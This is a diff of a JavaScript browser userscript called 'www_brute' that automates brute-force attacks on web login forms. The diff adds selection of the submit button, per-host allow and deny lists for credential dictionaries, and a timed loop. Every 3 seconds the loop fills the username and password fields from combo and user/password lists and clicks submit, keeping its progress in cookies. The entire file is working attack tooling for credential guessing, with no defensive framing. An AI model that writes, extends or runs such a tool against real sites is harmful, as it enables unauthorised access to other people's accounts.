@@ -5,11 +5,12 @@
 // @grant       none
 // ==/UserScript==
 
-var user_field, pass_field, brute_offset
+var BRUTE_INTERVAL_MS = 3000
+var user_field, pass_field, submit_field, brute_offset
 
 function init()
 {
-	console.info('[!] click on ' + ((user_field) ? '' : '<user> ') + ((pass_field) ? '' : '<pass> ') + 'fields' )
+	console.info('[!] click on ' + ((user_field) ? '' : '<user> ') + ((pass_field) ? '' : '<pass> ') + ((submit_field) ? '' : '<submit> ') + 'fields' )
 	document.getElementsByTagName('body')[0].addEventListener('click', function (e) {
   	if(! user_field )
 		{
@@ -21,6 +22,11 @@ function init()
 			pass_field = save_element( e.target, 'pass' )
 			console.log('[*] select <pass> field ' + pass_field)
 		}
+		else if(! submit_field)
+		{
+			submit_field = save_element( e.target, 'submit' )
+			console.log('[*] select <submit> field ' + submit_field)
+		}
 	} )
 }
 
@@ -29,7 +35,8 @@ function reset()
 	console.log('[*] reset')
 	delete_cookie( '__user=' + get_cookie('__user=') )
 	delete_cookie( '__pass=' + get_cookie('__pass=') )
-	delete_cookie( '__brute_offset=' + get_cookie('__brute_offset=') )
+	delete_cookie( '__submit=' + get_cookie('__submit=') )
+	delete_cookie( '__offset=' + get_cookie('__offset=') )
 }
 
 function save_cookie(cookie) 
@@ -67,7 +74,7 @@ function deserialize(string)
 	if(string)
 	{
 		string.split(',').map( function(attr_val) { elem[ attr_val.split(':')[0] ] = unescape( attr_val.split(':')[1] ) } )
-	  return elem
+		return elem
 	}
 }
 
@@ -81,11 +88,14 @@ function save_element(element, type)
 		case 'pass':
 			save_cookie( '__pass=' + serialize(element) )
 			break
+		case 'submit':
+			save_cookie( '__submit=' + serialize(element) )
+			break
 	}
 	return element
 }
 
-/*
+
 var similar_elements
 function similar_element(where, what)
 {
@@ -106,8 +116,6 @@ function similar_element(where, what)
 	}
 	if(elem)
 		return elem
-	else
-		return false
 }
 
 
@@ -116,24 +124,16 @@ function search_element(where, what)
 	for(var i = 0; i < where.children.length; i++)
 	{
 		var elem = where.children[i], is_found = true, matches = 0
-		if( elem.nodeName == 'INPUT' )
+		for(var attr in what)
 		{
-			for(var attr in what)
-			{
-				console.log( attr + ' = ' + what[attr] )
-				if( elem.getAttribute( attr ) == what[attr] )
-					matches++
-				else
-					is_found = false
-			}
-			console.log(elem)
-			console.log(matches)
-		}
+			if( elem.getAttribute( attr ) == what[attr] )
+				matches++
+			else
+				is_found = false
+		}		
 		if(is_found && matches)
-		{
-			console.log('break')
 			break
-		}
+		
 		if(matches)
 			similar_elements.push( { elem: elem, matches: matches } )
 		if( elem = search_element(elem, what) )
@@ -141,12 +141,10 @@ function search_element(where, what)
 	}
 	if(is_found)
 		return elem
-	else
-		return false
 }
-*/
 
 
+/*
 function search_input(what)
 {
 	var forms = document.getElementsByTagName('form')
@@ -169,71 +167,86 @@ function search_input(what)
 	}
  	return false
 }
-
+*/
 
 function get_element(type)
 {
 	switch(type)
 	{
 		case 'user':
-			return search_input( deserialize( get_cookie( '__user=' ) ) )
+			return similar_element( document.body, deserialize( get_cookie( '__user=' ) ) )
 		case 'pass':
-			return search_input( deserialize( get_cookie( '__pass=' ) ) )
+			return similar_element( document.body, deserialize( get_cookie( '__pass=' ) ) )
+		case 'submit':
+			return similar_element( document.body, deserialize( get_cookie( '__submit=' ) ) )
 	}
 }
 
-function send(elem)
+function send()
 {
-	while( elem.nodeName != 'FORM' )
-	{
-		elem = elem.parentNode
-		if( elem.nodeName == 'HTML' )
-			return
-	}
-	save_cookie( '__brute_offset=' + (brute_offset+1) )
-	elem.submit()
+	save_cookie( '__offset=' + (++brute_offset) )
+	submit_field.click()
 }
 
-function do_brute()
+function is_allow(dict)
+{
+	for( var loc = 0; loc < window.__brute[dict].allow.length; loc++ )
+		if(! window.__brute[dict].allow[loc].test( location.host ) )
+			return false
+	for( var loc = 0; loc < window.__brute[dict].deny.length; loc++ )
+		if( window.__brute[dict].deny[loc].test( location.host ) )
+			return false
+	return true
+}
+
+function do_brute(intr)
 {
 	if( brute_offset == undefined )
 	{
-		save_cookie('__brute_offset=0')
+		save_cookie('__offset=0')
 		brute_offset = 0
 	}
 	else
 		brute_offset = parseInt(brute_offset)
 	var offset = 0
 
-	if( window.__brute_users && window.__brute_passwords )
+	for( var dict = 0; dict < window.__brute.length; dict++ )
 	{
-		for(var i = 0; i < window.__brute_passwords.length; i++)
+		if(! is_allow(dict) )
+			continue
+		for( var i = 0; i < window.__brute[dict].combo.length; i++ )
 		{
-			for(var j = 0; j < window.__brute_users.length; j++)
+			if( brute_offset == offset )
 			{
-				if( brute_offset == offset )
+				user_field.value = window.__brute[dict].combo[i][0]
+				pass_field.value = window.__brute[dict].combo[i][1]
+				send()
+				return
+			}
+			offset++
+		}
+
+		if( window.__brute[dict].users && window.__brute[dict].passwords )
+		{
+			for(var i = 0; i < window.__brute[dict].passwords.length; i++)
+			{
+				for(var j = 0; j < window.__brute[dict].users.length; j++)
 				{
-					user_field.value = window.__brute_users[j]
-					pass_field.value = window.__brute_passwords[i]
-					send(user_field)	
+					if( brute_offset == offset )
+					{
+						user_field.value = window.__brute[dict].users[j]
+						pass_field.value = window.__brute[dict].passwords[i]
+						send()
+						return
+					}
+					offset++
 				}
-				offset++
 			}
 		}
 	}
 
-	for( var user in window.__brute_combo )
-	{
-		if( brute_offset == offset )
-		{
-			user_field.value = user
-			pass_field.value = window.__brute_combo[user]
-			send(user_field)
-		}
-		offset++
-	}
-	
 	console.info('[*] brute force attack was finished')
+	clearInterval(intr)
 	return false
 }
 
@@ -250,20 +263,18 @@ function brute()
 		reset()
 		return
 	}
-	brute_offset = get_cookie('__brute_offset=')
+	brute_offset = get_cookie('__offset=')
 	if( ( brute_offset != undefined || in_url('__init') ) )
 	{
 		function get_userpass_fields()
 		{
 			user_field = get_element('user')
 			pass_field = get_element('pass')
-			if(user_field && pass_field)
-				do_brute()
+			submit_field = get_element('submit')
+			if(user_field && pass_field && submit_field)
+				intr = setInterval( function() { do_brute(intr) }, BRUTE_INTERVAL_MS )
 			else
-			{
-				console.log('missing <user> or <pass> fields')
 				setTimeout(get_userpass_fields, 1000)
-			}
 		}
 		get_userpass_fields()
 	}
@@ -276,7 +287,7 @@ function brute()
 
 try
 {
-	console.info('[*] www_brute v0.5')
+	console.info('[*] www_brute v0.13')
 	brute()
 }
 catch(exc)
